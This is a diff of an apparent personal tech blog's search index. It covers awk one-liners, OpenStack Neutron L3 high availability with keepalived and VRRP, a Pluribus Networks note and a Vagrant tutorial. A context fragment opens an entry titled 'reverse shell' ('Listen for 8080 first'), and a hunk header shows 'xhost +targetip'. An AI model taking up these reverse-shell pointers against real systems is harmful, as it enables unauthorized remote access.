+<figure class="highlight bash"><table><tr><td class="code"><pre><div class="line">awk <span class="string">'&#123;x[NR]=$0&#125; END&#123;for(i=NR;i&gt;0;i--)print x[i]&#125;'</span> filename</div></pre></td></tr></table></figure>
+<ul>
+<li>Associative Arrays </li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="code"><pre><div class="line">awk <span class="string">'&#123;amount[$1]=$2&#125; END&#123;for(name in amount) print name, amount[name]&#125;'</span> filename</div></pre></td></tr></table></figure>
+]]></content>
+    </entry>
+    
+    <entry>
       <title><![CDATA[reverse shell]]></title>
       <url>http://feisky.xyz/2015/01/27/reverse-shell/</url>
       <content type="html"><![CDATA[<h3 id="Listen-for-8080-first"><a href="#Listen-for-8080-first" class="headerlink" title="Listen for 8080 first"></a>Listen for 8080 first</h3><pre>
@@ -6316,61 +6375,165 @@ xhost +targetip
     </entry>
     
     <entry>
-      <title><![CDATA[awk examples]]></title>
-      <url>http://feisky.xyz/2015/01/27/awk-examples/</url>
-      <content type="html"><![CDATA[<ul>
-<li>precede each line by line number</li>
-</ul>
-<figure class="highlight bash"><table><tr><td class="code"><pre><div class="line">awk <span class="string">'&#123;print NR, $0&#125;'</span> filename</div></pre></td></tr></table></figure>
+      <title><![CDATA[Neutron Layer 3 High Availability]]></title>
+      <url>http://feisky.xyz/2015/01/26/neutron-layer-3-high-availability/</url>
+      <content type="html"><![CDATA[<p><strong>L3 Agent Low Availability</strong></p>
+<p>Today, you can utilize multiple network nodes to achieve load sharing, but not high availability or redundancy. Assuming three network nodes, creation of new routers will be scheduled and distributed amongst those three nodes. However, if a node&nbsp;drops, all routers on that node will cease to exist as well as any traffic normally forwarded by those routers. Neutron, in the Icehouse release, doesn’t support any built-in solution.</p>
+<p><strong>A Detour to the DHCP Agent</strong></p>
+<p>DHCP agents are a different beast altogether – The DHCP protocol allows for the co-existence of multiple DHCP servers all serving the same pool, at the same time.</p>
+<p>By changing:</p>
+<pre>
+<span class="skimlinks-unlinked">neutron.conf</span>:
+dhcp_agents_per_network = X
+</pre>
+
+<p>You will change the DHCP scheduler to schedule X DHCP agents per network. So, for a deployment with 3 network nodes, and setting&nbsp;dhcp_agents_per_network to 2, every Neutron network will be served by 2 DHCP agents out of 3. How does this work?</p>
+<p><img src="http://assafmuller.files.wordpress.com/2014/08/dhcp_ha_topology1.png?w=696" alt="dhcp_ha_topology"></p>
+<p>First, let’s take a look at the story from a baremetal perspective, outside of the cloud world. When the workstation is connected to a subnet&nbsp;in the 10.0.0.0/24 subnet, it broadcasts a DHCP discover. Both DHCP servers dnsmasq1 and dnsmasq2 (Or other implementations of a DHCP server) receive the broadcast and respond with an offer for 10.0.0.2. Assuming that the first server’s response was received by the workstation first, it will then broadcast a request for 10.0.0.2, and specify the IP address of dnsmasq1 – 10.0.0.253. Both servers receive the broadcast, but only dnsmasq1 responds with an ACK.&nbsp;Since all DHCP communication is via broadcasts, server 2 also receives the ACK,&nbsp;and can mark 10.0.0.2 as taken by AA:BB:CC:11:22:33, so as to not offer it to other workstations. To summarize, all communication between clients and servers is done via broadcasts and thus the state (What IPs are used at any given time, and by who) can be distributed across the servers correctly.</p>
+<p>In the Neutron case, the assignment from MAC to IP is configured on each dnsmasq server beforehand, when the Neutron port is created. Thus, both dnsmasq leases file will hold the AA:BB:CC:11:22:33 to 10.0.0.2 mapping before the DHCP request is even broadcast. As you can see, DHCP HA is&nbsp;supported at the protocol level.</p>
+<p><strong>Back to the Lowly Available L3 Agent</strong></p>
+<p>L3 agents don’t (Currently) have any of these fancy tricks that DHCP offers, and yet the people demand high availability. So what are the people doing?</p>
 <ul>
-<li>replace first field by line number</li>
+<li>Pacemaker / Corosync – Use external clustering technologies to specify a standby network node for an active one. The standby node will essentially sit there looking pretty, and when a failure is detected with the active node, the L3 agent will be started on the standby node. The two nodes are configured with the same hostname so that when the secondary agent goes live and synchronizes with the server, it identifies itself with the same ID and thus manages&nbsp;the same routers.</li>
+<li>Another type of solution writes a script that runs as a cron job. This would be a Python SDK script that would use the API to get a list of dead agents, get all the routers on that agent, and reschedule them to other agents.</li>
+<li>In the Juno time frame, look for this patch&nbsp;<a href="https://review.openstack.org/#/c/110893/&nbsp;by" target="_blank" rel="external">https://review.openstack.org/#/c/110893/&nbsp;by</a> <a href="http://homes.soic.indiana.edu/ktbenton/" target="_blank" rel="external">Kevin Benton</a> to bake rescheduling into Neutron itself.</li>
 </ul>
-<figure class="highlight bash"><table><tr><td class="code"><pre><div class="line">awk <span class="string">'&#123;$1=NR; print&#125;'</span> filename</div></pre></td></tr></table></figure>
+<p><strong>Rescheduling Routers Takes a Long, Long Time</strong></p>
+<p>All solutions listed suffer from a substantial failover time, if only for the simple fact that configuring a non-trivial amount of routers on the new node(s) takes quite a while. Thousands of routers take hours to&nbsp;finish the rescheduling and configuration process. The people demand fast failover!</p>
+<p><strong>Distributed Virtual Router</strong></p>
+<p>DVR has multiple documents explaining how it works:</p>
 <ul>
-<li>print field 1 and field 2</li>
+<li><a href="http://specs.openstack.org/openstack/neutron-specs/specs/juno/neutron-ovs-dvr.html" target="_blank" rel="external">http://specs.openstack.org/openstack/neutron-specs/specs/juno/neutron-ovs-dvr.html</a></li>
+<li><a href="https://docs.google.com/document/d/1jCmraZGirmXq5V1MtRqhjdZCbUfiwBhRkUjDXGt5QUQ/" target="_blank" rel="external">https://docs.google.com/document/d/1jCmraZGirmXq5V1MtRqhjdZCbUfiwBhRkUjDXGt5QUQ/</a></li>
+<li><a href="https://docs.google.com/document/d/1depasJSnGZPOnRLxEC_PYsVLcGVFXZLqP52RFTe21BE/" target="_blank" rel="external">https://docs.google.com/document/d/1depasJSnGZPOnRLxEC_PYsVLcGVFXZLqP52RFTe21BE/</a></li>
 </ul>
-<figure class="highlight bash"><table><tr><td class="code"><pre><div class="line">awk <span class="string">'&#123;print $1,$2&#125;'</span> fielname</div></pre></td></tr></table></figure>
+<p>The gist is that it moves routing to the compute nodes, rendering the L3 agent on the network nodes pointless. Or does it?</p>
 <ul>
-<li>print last field </li>
+<li>DVR handles only floating IPs, leaving SNAT to the L3 agents on the network nodes</li>
+<li>Doesn’t work with VLANs, only works with <a href="http://assafmuller.wordpress.com/2013/10/14/gre-tunnels-in-openstack-neutron/" title="GRE Tunnels in OpenStack Neutron" target="_blank" rel="external">tunnels</a> and <a href="http://assafmuller.wordpress.com/2014/02/23/ml2-address-population/" title="ML2 – Address Population" target="_blank" rel="external">L2pop</a> enabled</li>
+<li>Requires external connectivity on every compute node</li>
+<li>Generally speaking, is a significant departure from Havana or Icehouse Neutron based clouds, while L3 HA is a simpler change to make for your deployment</li>
 </ul>
-<figure class="highlight bash"><table><tr><td class="code"><pre><div class="line">awk <span class="string">'&#123;print $NF&#125;'</span> filename</div></pre></td></tr></table></figure>
+<p>Ideally you would use DVR together with L3 HA. Floating IP traffic would be routed directly by your compute nodes, while SNAT traffic would go through the HA L3 agents on the network nodes.</p>
+<p><strong>Layer 3 High Availability</strong></p>
+<p>The Juno targeted L3 HA solution uses the popular Linux keepalived tool, which uses VRRP internally. First, then, let’s discuss VRRP.</p>
+<p><strong>What is VRRP, how does it work in the physical world?</strong></p>
+<p>Virtual Router Redundancy Protocol is a<a href="http://en.wikipedia.org/wiki/First-hop_redundancy_protocols" target="_blank" rel="external"> first hop redundancy protocol</a>&nbsp;– It aims to provide high availability of the network’s default gateway, or the next hop of a route. What problem does it solve? In a network topology with two routers providing internet connectivity, you could assign half of the network’s default gateway to the first router’s IP address, and the other half to the second router.</p>
+<p><img src="http://assafmuller.files.wordpress.com/2014/08/router_ha_topology_before_vrrp.png?w=696" alt="router_ha_topology_before_vrrp"></p>
+<p>This would provide load sharing, but what happens if one router loses connectivity? Herein comes the idea of a virtual IP address, or a floating address, which will be configured as the network’s default gateway. During a failover, the standby routers won’t receive VRRP hello messages from the master and will thus perform an election process, with the winning router acting as the active gateway, and the others remain as standby. The active router configures the virtual IP address (Or VIP for short), on its internal, LAN facing interface, and responds to ARP requests with a virtual MAC address. The network computers already have entries in their ARP caches (For the VIP + virtual MAC address) and have no reason to resend an ARP request. Following the election process, the virtuous standby router becomes the new active instance, and sends a gratuitous ARP request – Proclaiming to the network that the VIP + MAC pair now belong to it. The switches comprising the network move the virtual MAC address from the old port to the new.</p>
+<p><a href="https://assafmuller.files.wordpress.com/2014/08/switch_moves_mac.png" target="_blank" rel="external"><img src="http://assafmuller.files.wordpress.com/2014/08/switch_moves_mac.png?w=696" alt="switch_moves_mac"></a></p>
+<p>By doing so, traffic to the default gateway will reach the correct (New) active router. Note that this approach does not accomplish load sharing, in the sense that all traffic is forwarded through the active router. (Note that in the Neutron use case, load sharing is not accomplished at the individual router level, but at the node level, assuming a non-trivial amount of routers). How does one accomplish load sharing at the router resolution? VRRP groups: The VRRP header includes a Virtual Router Identifier, or VRID. Half of the network hosts will configure the first VIP, and the other half the second. In the case of a failure, the VIP previously found on the failing router will transfer to another one.</p>
+<p><a href="https://assafmuller.files.wordpress.com/2014/08/router_ha_two_vrrp_groups.png" target="_blank" rel="external"><img src="http://assafmuller.files.wordpress.com/2014/08/router_ha_two_vrrp_groups.png?w=696&amp;h=945" alt="router_ha_two_vrrp_groups"></a></p>
+<p>The observant reader will have identified a problem – What if the active router loses connectivity to the internet? Will it remain as the active router, unable to route packets? VRRP adds the capability to monitor the external link and relinquish its role as the active router in case of a failure.<a href="https://assafmuller.files.wordpress.com/2014/08/router_ha_external_trap.png" target="_blank" rel="external"><img src="http://assafmuller.files.wordpress.com/2014/08/router_ha_external_trap.png?w=696" alt="router_ha_external_trap"></a></p>
+<p>Note: As far as IP addressing goes, it’s possible to operate in two modes:</p>
+<ol>
+<li>Each router gets an IP address, regardless of its VRRP state. The master router is configured with the VIP as an additional &nbsp;or secondary address.</li>
+<li>Only the VIP is configured. IE: The master router will hold the VIP while the slaves will have no IPs configured whatsoever.</li>
+</ol>
+<p><strong>VRRP – The Dry Facts</strong></p>
 <ul>
-<li>print non empty lines</li>
+<li>Encapsulated directly in the IP protocol</li>
+<li>Active instance uses multicast address 224.0.0.18, MAC&nbsp;01-00-5E-00-00-12 when sending hello messages to its standby routers</li>
+<li>The virtual MAC address is of the form:&nbsp;00-00-5E-00-01-{VRID}, thus only 256 different VRIDs (0 to 255) can exist in a single broadcast domain</li>
+<li>The election process uses a user configurable priority, from 1 to 255, the higher the better</li>
+<li>Preemptive elections, like in other network protocols, means that if a standby is configured with a higher priority, or comes back after losing its connectivity (And previously acting as the active instance) it will resume its role as the active router</li>
+<li>Non-preemptive elections mean that when an active router loses its connectivity and comes back up, it will remain in a standby role</li>
+<li>The hello internal is configurable (Say: Every T seconds), and standby routers perform an election process if they haven’t received a hello message from the master after 3T seconds</li>
 </ul>
-<figure class="highlight bash"><table><tr><td class="code"><pre><div class="line">awk <span class="string">'NF&gt;0&#123;print $0&#125;'</span> filename</div></pre></td></tr></table></figure>
+<p><strong>Back to Neutron-land</strong></p>
+<p>L3 HA starts a keepalived instance in every router namespace. The different router instances talk to one another via a dedicated HA network, one per tenant. This network is created under the blank tenant to hide it from the CLI and GUI. The HA network is a &nbsp;Neutron tenant network, same as every other network, and uses the default segmentation technology. HA routers have an ‘HA’ device in their namespace: When a HA router is created, it is scheduled to a number of network nodes, along with a port per network node, belonging to the tenant’s HA network. keepalived traffic is forwarded through the HA device (As specified in the <span class="skimlinks-unlinked">keepalived.conf</span> file used by the keepalived instance in the router namespace). Here’s the output of ‘ip address’ in the router namespace:</p>
+<pre>
+[stack@vpn-6-88 ~]$ sudo ip netns exec qrouter-b30064f9-414e-4c98-ab42-646197c74020 ip address
+1: lo: <loopback,up,lower_up> mtu 65536 qdisc noqueue state UNKNOWN group default 
+    ...
+2794: **ha-45249562-ec**: <broadcast,multicast,up,lower_up> mtu 1500 qdisc noqueue state UNKNOWN group default 
+    link/ether 12:34:56:78:2b:5d brd ff:ff:ff:ff:ff:ff
+    inet 169.254.0.2/24 brd 169.254.0.255 scope global ha-54b92d86-4f
+       valid_lft forever preferred_lft forever
+    inet6 fe80::1034:56ff:fe78:2b5d/64 scope link 
+       valid_lft forever preferred_lft forever
+2795: qr-dc9d93c6-e2: <broadcast,multicast,up,lower_up> mtu 1500 qdisc noqueue state UNKNOWN group default 
+    link/ether ca:fe:de:ad:be:ef brd ff:ff:ff:ff:ff:ff
+    inet 10.0.0.1/24 scope global qr-0d51eced-0f
+       valid_lft forever preferred_lft forever
+    inet6 fe80::c8fe:deff:fead:beef/64 scope link 
+       valid_lft forever preferred_lft forever
+2796: qg-843de7e6-8f: <broadcast,multicast,up,lower_up> mtu 1500 qdisc noqueue state UNKNOWN group default 
+    link/ether ca:fe:de:ad:be:ef brd ff:ff:ff:ff:ff:ff
+    inet 19.4.4.4/24 scope global qg-75688938-8d
+       valid_lft forever preferred_lft forever
+    inet6 fe80::c8fe:deff:fead:beef/64 scope link 
+       valid_lft forever preferred_lft forever
+</broadcast,multicast,up,lower_up></broadcast,multicast,up,lower_up></broadcast,multicast,up,lower_up></loopback,up,lower_up></pre>
+
+<p>That is the output for the master instance. The same router on another node would have no IP address on the ha, qr, or qg devices. It would have no floating IPs or routing entries. These are persisted as configuration values in <span class="skimlinks-unlinked">keepalived.conf</span>, and when keepalived detects the master instance failing, these addresses (Or: VIPs) are configured by keepalived on the appropriate devices. Here’s an example of <span class="skimlinks-unlinked">keepalived.conf</span>, for the same router shown above:</p>
+<pre>
+vrrp_sync_group VG_1 {
+    group {
+        VR_1
+    }
+    notify_backup "/path/to/<span class="skimlinks-unlinked">notify_backup.sh</span>"
+    notify_master "/path/to/<span class="skimlinks-unlinked">notify_master.sh</span>"
+    notify_fault "/path/to/<span class="skimlinks-unlinked">notify_fault.sh</span>"
+}
+vrrp_instance VR_1 {
+    state BACKUP
+    interface ha-45249562-ec
+    virtual_router_id 1
+    priority 50
+    nopreempt
+    advert_int 2
+    track_interface {
+        ha-45249562-ec
+    }
+    virtual_ipaddress {
+        19.4.4.4/24 dev qg-843de7e6-8f
+    }
+    virtual_ipaddress_excluded {
+        10.0.0.1/24 dev qr-dc9d93c6-e2
+    }
+    virtual_routes {
+        0.0.0.0/0 via 19.4.4.1 dev qg-843de7e6-8f
+    }
+}
+</pre>
+
+<p>What are those notify scripts? These are scripts that keepalived executes upon transition to master, backup, or fault. Here’s the contents of the master script:</p>
+<pre>
+#!/usr/bin/env bash
+neutron-ns-metadata-proxy --pid_file=/tmp/tmpp_6Lcx/tmpllLzNs/external/pids/b30064f9-414e-4c98-ab42-646197c74020/pid --metadata_proxy_socket=/tmp/tmpp_6Lcx/tmpllLzNs/metadata_proxy --router_id=b30064f9-414e-4c98-ab42-646197c74020 --state_path=/opt/openstack/neutron --metadata_port=9697 --debug --verbose
+echo -n master > /tmp/tmpp_6Lcx/tmpllLzNs/ha_confs/b30064f9-414e-4c98-ab42-646197c74020/state
+</pre>
+
+<p>The master script simply opens up the metadata proxy, and writes the state to a state file, which can be later read by the L3 agent. The backup and fault scripts kill the proxy and write their respective states to the aforementioned state file. This means that the metadata proxy will be live only on the master router instance.</p>
+<p><strong>* Aren’t We Forgetting the Metadata Agent?</strong></p>
+<p>Simply enable the agent on every network node and you’re good to go.</p>
+<p><strong>Future Work &amp; Limitations</strong></p>
 <ul>
-<li>print if more than 4 fields</li>
+<li>TCP connection tracking – With the current implementation, TCP sessions are broken on failover. The idea is to use conntrackd in order to replicate the session states across HA routers, so that when the failover finishes, TCP sessions will continue where they left off.</li>
+<li>Where is the master instance hosted? As it is now it is impossible for the admin to know which network node is hosting the master instance of a HA router. The plan is for the agents to report this information and for the server to expose it via the API.</li>
+<li>Evacuating an agent – Ideally bringing down a node for maintenance should cause all of the HA router instances on said node to relinquish their master states, speeding up the failover process.</li>
+<li>Notifying L2pop of VIP movements – Consider the IP/MAC of the router on a tenant network. Only the master instance will actually have the IP configured, but the same Neutron port and same MAC will show up on all participating network nodes. This might have adverse effects on the L2pop mechanism driver, as it expects a MAC address in a single location in the network. The plan to solve this deficiency is to send an RPC message from the agent whenever it detects a VRRP state change, so that when a router becomes the master, the controller is notified, which can then update the L2pop state.</li>
+<li>FW, VPN and LB as a service integration. Both DVR and L3 HA have issues integrating with the advanced services, and a more serious look will be taken during the Kilo cycle.</li>
+<li>One HA network per tenant. This implies a limit of 255 HA routers per tenant, as each router takes up a VRID, and the VRRP protocol allows 255 distinct VRID values in a single broadcast domain.</li>
 </ul>
-<figure class="highlight bash"><table><tr><td class="code"><pre><div class="line">awk <span class="string">'NF&gt;4&#123;print $0&#125;'</span> filename</div></pre></td></tr></table></figure>
+<p><strong>Usage &amp; Configuration</strong></p>
+<pre>
+<span class="skimlinks-unlinked">neutron.conf</span>:
+l3_ha = True
+max_l3_agents_per_router = 2
+min_l3_agents_per_router = 2
+</pre>
+
 <ul>
-<li><p>print matching lines (egrep)</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><div class="line">awk <span class="string">'/test.*/&#123;print $0&#125;'</span>  filename</div></pre></td></tr></table></figure>
-</li>
+<li>l3_ha = True means that all router creations will default to HA (And not legacy) routers. This is turned off by default.</li>
+<li>You can set the max to a number between min and the number of network nodes in your deployment. If you deploy 4 net nodes but set max to 2, only two l3 agents will be used per HA router (One master, one slave).</li>
+<li>min is used as a sanity check: If you have two network nodes and one goes out momentarily, any new routers created during that time period will fail as you need at least <min> L3 agents up when creating a HA router.</min></li>
 </ul>
-<ul>
-<li>print lines where first field matches</li>
-</ul>
-<figure class="highlight bash"><table><tr><td class="code"><pre><div class="line">awk <span class="string">'$1 ~ /^print.*/&#123;print $0&#125;'</span> filename</div></pre></td></tr></table></figure>
-<ul>
-<li>calcuting sum of field 2</li>
-</ul>
-<figure class="highlight bash"><table><tr><td class="code"><pre><div class="line">awk <span class="string">'BEGIN&#123;sum=0&#125;&#123;sum+=$2&#125;END&#123;print sum&#125;'</span> filename</div></pre></td></tr></table></figure>
-<ul>
-<li>for loop</li>
-</ul>
-<figure class="highlight bash"><table><tr><td class="code"><pre><div class="line">awk <span class="string">'&#123;sum=0; for(i=1;i&lt;=NF;i++)sum+=$i; print sum&#125;'</span> filename</div></pre></td></tr></table></figure>
-<ul>
-<li>make arrays</li>
-</ul>
-<figure class="highlight bash"><table><tr><td class="code"><pre><div class="line">awk <span class="string">'&#123;n = split($0, array); print array[1], array[3]&#125; '</span> filename</div></pre></td></tr></table></figure>
-<ul>
-<li>reverse a file</li>
-</ul>
-<figure class="highlight bash"><table><tr><td class="code"><pre><div class="line">awk <span class="string">'&#123;x[NR]=$0&#125; END&#123;for(i=NR;i&gt;0;i--)print x[i]&#125;'</span> filename</div></pre></td></tr></table></figure>
-<ul>
-<li>Associative Arrays </li>
-</ul>
-<figure class="highlight bash"><table><tr><td class="code"><pre><div class="line">awk <span class="string">'&#123;amount[$1]=$2&#125; END&#123;for(name in amount) print name, amount[name]&#125;'</span> filename</div></pre></td></tr></table></figure>
+<p>l3_ha controls the default, while the CLI allows an admin (And only admins) to override that setting on a per router basis:</p>
+<pre>
+neutron router-create --ha=<true |="" false=""> router1
+</true></pre>
 ]]></content>
     </entry>
     
@@ -6727,6 +6890,54 @@ This means that there is no need for manual setup of block devices, and that gen
 <p>Notice that FD 0, 1, &amp; 2 all go to the TTY.</p>
 <p>If you look at a normal terminal session, you’ll see the same thing (STDIN, STDOUT, STDERR all going to the same TTY). The reason redirection works in your terminal is because you’re performing the redirection BEFORE it gets sent into the TTY device. If you perform the redirection inside the docker container, you can accomplish the same thing.</p>
 <p>Refer to <a href="https://github.com/docker/docker/issues/19696" target="_blank" rel="external">https://github.com/docker/docker/issues/19696</a> for more.</p>
+]]></content>
+    </entry>
+    
+    <entry>
+      <title><![CDATA[Pluribus Networks]]></title>
+      <url>http://feisky.xyz/2015/01/26/pluribus-networks/</url>
+      <content type="html"><![CDATA[<p>已经融资9500万美元的<a href="http://www.pluribusnetworks.com" target="_blank" rel="external">Pluribus</a>公司，做得Server Switch产品，其CEO说，既能克服Vmware产品的scalability, invisibility, performance问题，又能克服Cisco ACI的系统封闭性。说白了就是把网络做在服务器里面，但是网络处理发生在交换芯片而不是CPU里面，跟Facebook Wedge一样 @盛科张卫峰</p>
+]]></content>
+    </entry>
+    
+    <entry>
+      <title><![CDATA[vagrant]]></title>
+      <url>http://feisky.xyz/2015/01/26/vagrant/</url>
+      <content type="html"><![CDATA[<p>简易虚拟机管理工具vagrant</p>
+<h3 id="Vagrant简介"><a href="#Vagrant简介" class="headerlink" title="Vagrant简介"></a>Vagrant简介</h3><p>Vagrant是一款跨平台的虚拟机管理工具，可以用来封装跨平台的开发环境，分发给团队成员共享。</p>
+<h3 id="如何安装"><a href="#如何安装" class="headerlink" title="如何安装"></a>如何安装</h3><p>1.安装 VirtualBox</p>
+<p>Vagrant支持VMWare和VirtualBox，不过VMWare版本是收费的，简易使用VirtualBox版本。</p>
+<p>VirtualBox下载地址见<a href="http://www.virtualbox.org" target="_blank" rel="external">http://www.virtualbox.org</a></p>
+<p>2.安装 Vagrant</p>
+<p>下载Vagrant <a href="http://downloads.vagrantup.com/" target="_blank" rel="external">http://downloads.vagrantup.com/</a>，根据提示安装。</p>
+<p>首次使用可以下载官方封装好的基础镜像：<br>Ubuntu precise 32 VirtualBox <a href="http://files.vagrantup.com/precise32.box" target="_blank" rel="external">http://files.vagrantup.com/precise32.box</a><br>Ubuntu precise 64 VirtualBox <a href="http://files.vagrantup.com/precise64.box" target="_blank" rel="external">http://files.vagrantup.com/precise64.box</a></p>
+<p><a href="http://www.vagrantbox.es/" target="_blank" rel="external">http://www.vagrantbox.es/</a>提供了丰富的镜像资源，需要时可以去下载。</p>
+<p>3.添加镜像到 Vagrant</p>
+<p>假设我们下载的镜像存放路径是 ~/box/precise64.box，在终端里输入：</p>
+<figure class="highlight processing"><table><tr><td class="code"><pre><div class="line">$ vagrant <span class="built_in">box</span> <span class="built_in">add</span> ubuntu ~/<span class="built_in">box</span>/precise64.<span class="built_in">box</span></div></pre></td></tr></table></figure>
+<p>如果上一步没有下载镜像，可以在添加镜像的时候自动下载:</p>
+<figure class="highlight armasm"><table><tr><td class="code"><pre><div class="line">$ vagrant <span class="keyword">box </span><span class="keyword">add </span><span class="keyword">base </span>http://files.vagrantup.com/lucid32.<span class="keyword">box</span></div></pre></td></tr></table></figure>
+<p>4.创建虚拟机</p>
+<p>创建一个开发目录，用作虚拟机的工作目录，然后使用ubuntu这个镜像初始化虚拟机：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><div class="line">$ <span class="built_in">cd</span> ~/dev  <span class="comment"># 切换目录</span></div><div class="line">$ vagrant init ubuntu  <span class="comment"># 初始化</span></div><div class="line">$ vagrant up  <span class="comment"># 启动虚拟机</span></div></pre></td></tr></table></figure>
+<p>启动完毕后就可以通过SSH登录了：</p>
+<figure class="highlight elixir"><table><tr><td class="code"><pre><div class="line"><span class="variable">$ </span>vagrant ssh  <span class="comment"># SSH 登录</span></div></pre></td></tr></table></figure>
+<p>注意如果机器上未安装ssh，则可以下载xshell、putty等工具连接，默认端口会自动映射到本机2222端口。</p>
+<p>5.配置文件</p>
+<p>Vagrant 初始化成功后，会在初始化的目录里生成一个 Vagrantfile 的配置文件，可以修改配置文件进行个性化的定制。如配置内网ip地址</p>
+<figure class="highlight css"><table><tr><td class="code"><pre><div class="line"><span class="selector-tag">config</span><span class="selector-class">.vm</span><span class="selector-class">.network</span> <span class="selector-pseudo">:private_network</span>, <span class="selector-tag">ip</span>: "192<span class="selector-class">.168</span><span class="selector-class">.33</span><span class="selector-class">.10</span>"</div></pre></td></tr></table></figure>
+<p>配置hostname，并将虚拟机的80端口映射到本机8080端口</p>
+<figure class="highlight stylus"><table><tr><td class="code"><pre><div class="line">config<span class="selector-class">.vm</span><span class="selector-class">.hostname</span> = <span class="string">"ubuntu"</span></div><div class="line">config<span class="selector-class">.vm</span><span class="selector-class">.network</span> :forwarded_port, guest: <span class="number">80</span>, host: <span class="number">8080</span></div></pre></td></tr></table></figure>
+<p>6.打包分发</p>
+<p>执行下面的语句，会在当前目录生成一个 package.box 的文件，将这个文件传给其他用户，其他用户只要添加这个 box就可以创建一个相同的虚拟机了：<br><figure class="highlight actionscript"><table><tr><td class="code"><pre><div class="line">$ vagrant <span class="class"><span class="keyword">package</span></span></div></pre></td></tr></table></figure></p>
+<p>7.常用命令</p>
+<figure class="highlight elixir"><table><tr><td class="code"><pre><div class="line"><span class="variable">$ </span>vagrant init  <span class="comment"># 初始化</span></div><div class="line"><span class="variable">$ </span>vagrant up  <span class="comment"># 启动虚拟机</span></div><div class="line"><span class="variable">$ </span>vagrant halt  <span class="comment"># 关闭虚拟机</span></div><div class="line"><span class="variable">$ </span>vagrant reload  <span class="comment"># 重启虚拟机</span></div><div class="line"><span class="variable">$ </span>vagrant ssh  <span class="comment"># SSH 至虚拟机</span></div><div class="line"><span class="variable">$ </span>vagrant status  <span class="comment"># 查看虚拟机运行状态</span></div><div class="line"><span class="variable">$ </span>vagrant destroy  <span class="comment"># 销毁当前虚拟机</span></div></pre></td></tr></table></figure>
+<p>8.注意事项</p>
+<p>使用 Apache/Nginx 时会出现诸如图片修改后但页面刷新仍然是旧文件的情况，是由于静态文件缓存造成的。需要对虚拟机里的 Apache/Nginx 配置文件进行修改：</p>
+<p>Apache 配置添加:</p>
+<p>EnableSendfile off</p>
+<p>Nginx 配置添加:</p>
+<p>sendfile off;</p>
 ]]></content>
     </entry>
     
@@ -7221,217 +7432,6 @@ This means that there is no need for manual setup of block devices, and that gen
     </entry>
     
     <entry>
-      <title><![CDATA[Neutron Layer 3 High Availability]]></title>
-      <url>http://feisky.xyz/2015/01/26/neutron-layer-3-high-availability/</url>
-      <content type="html"><![CDATA[<p><strong>L3 Agent Low Availability</strong></p>
-<p>Today, you can utilize multiple network nodes to achieve load sharing, but not high availability or redundancy. Assuming three network nodes, creation of new routers will be scheduled and distributed amongst those three nodes. However, if a node&nbsp;drops, all routers on that node will cease to exist as well as any traffic normally forwarded by those routers. Neutron, in the Icehouse release, doesn’t support any built-in solution.</p>
-<p><strong>A Detour to the DHCP Agent</strong></p>
-<p>DHCP agents are a different beast altogether – The DHCP protocol allows for the co-existence of multiple DHCP servers all serving the same pool, at the same time.</p>
-<p>By changing:</p>
-<pre>
-<span class="skimlinks-unlinked">neutron.conf</span>:
-dhcp_agents_per_network = X
-</pre>
-
-<p>You will change the DHCP scheduler to schedule X DHCP agents per network. So, for a deployment with 3 network nodes, and setting&nbsp;dhcp_agents_per_network to 2, every Neutron network will be served by 2 DHCP agents out of 3. How does this work?</p>
-<p><img src="http://assafmuller.files.wordpress.com/2014/08/dhcp_ha_topology1.png?w=696" alt="dhcp_ha_topology"></p>
-<p>First, let’s take a look at the story from a baremetal perspective, outside of the cloud world. When the workstation is connected to a subnet&nbsp;in the 10.0.0.0/24 subnet, it broadcasts a DHCP discover. Both DHCP servers dnsmasq1 and dnsmasq2 (Or other implementations of a DHCP server) receive the broadcast and respond with an offer for 10.0.0.2. Assuming that the first server’s response was received by the workstation first, it will then broadcast a request for 10.0.0.2, and specify the IP address of dnsmasq1 – 10.0.0.253. Both servers receive the broadcast, but only dnsmasq1 responds with an ACK.&nbsp;Since all DHCP communication is via broadcasts, server 2 also receives the ACK,&nbsp;and can mark 10.0.0.2 as taken by AA:BB:CC:11:22:33, so as to not offer it to other workstations. To summarize, all communication between clients and servers is done via broadcasts and thus the state (What IPs are used at any given time, and by who) can be distributed across the servers correctly.</p>
-<p>In the Neutron case, the assignment from MAC to IP is configured on each dnsmasq server beforehand, when the Neutron port is created. Thus, both dnsmasq leases file will hold the AA:BB:CC:11:22:33 to 10.0.0.2 mapping before the DHCP request is even broadcast. As you can see, DHCP HA is&nbsp;supported at the protocol level.</p>
-<p><strong>Back to the Lowly Available L3 Agent</strong></p>
-<p>L3 agents don’t (Currently) have any of these fancy tricks that DHCP offers, and yet the people demand high availability. So what are the people doing?</p>
-<ul>
-<li>Pacemaker / Corosync – Use external clustering technologies to specify a standby network node for an active one. The standby node will essentially sit there looking pretty, and when a failure is detected with the active node, the L3 agent will be started on the standby node. The two nodes are configured with the same hostname so that when the secondary agent goes live and synchronizes with the server, it identifies itself with the same ID and thus manages&nbsp;the same routers.</li>
-<li>Another type of solution writes a script that runs as a cron job. This would be a Python SDK script that would use the API to get a list of dead agents, get all the routers on that agent, and reschedule them to other agents.</li>
-<li>In the Juno time frame, look for this patch&nbsp;<a href="https://review.openstack.org/#/c/110893/&nbsp;by" target="_blank" rel="external">https://review.openstack.org/#/c/110893/&nbsp;by</a> <a href="http://homes.soic.indiana.edu/ktbenton/" target="_blank" rel="external">Kevin Benton</a> to bake rescheduling into Neutron itself.</li>
-</ul>
-<p><strong>Rescheduling Routers Takes a Long, Long Time</strong></p>
-<p>All solutions listed suffer from a substantial failover time, if only for the simple fact that configuring a non-trivial amount of routers on the new node(s) takes quite a while. Thousands of routers take hours to&nbsp;finish the rescheduling and configuration process. The people demand fast failover!</p>
-<p><strong>Distributed Virtual Router</strong></p>
-<p>DVR has multiple documents explaining how it works:</p>
-<ul>
-<li><a href="http://specs.openstack.org/openstack/neutron-specs/specs/juno/neutron-ovs-dvr.html" target="_blank" rel="external">http://specs.openstack.org/openstack/neutron-specs/specs/juno/neutron-ovs-dvr.html</a></li>
-<li><a href="https://docs.google.com/document/d/1jCmraZGirmXq5V1MtRqhjdZCbUfiwBhRkUjDXGt5QUQ/" target="_blank" rel="external">https://docs.google.com/document/d/1jCmraZGirmXq5V1MtRqhjdZCbUfiwBhRkUjDXGt5QUQ/</a></li>
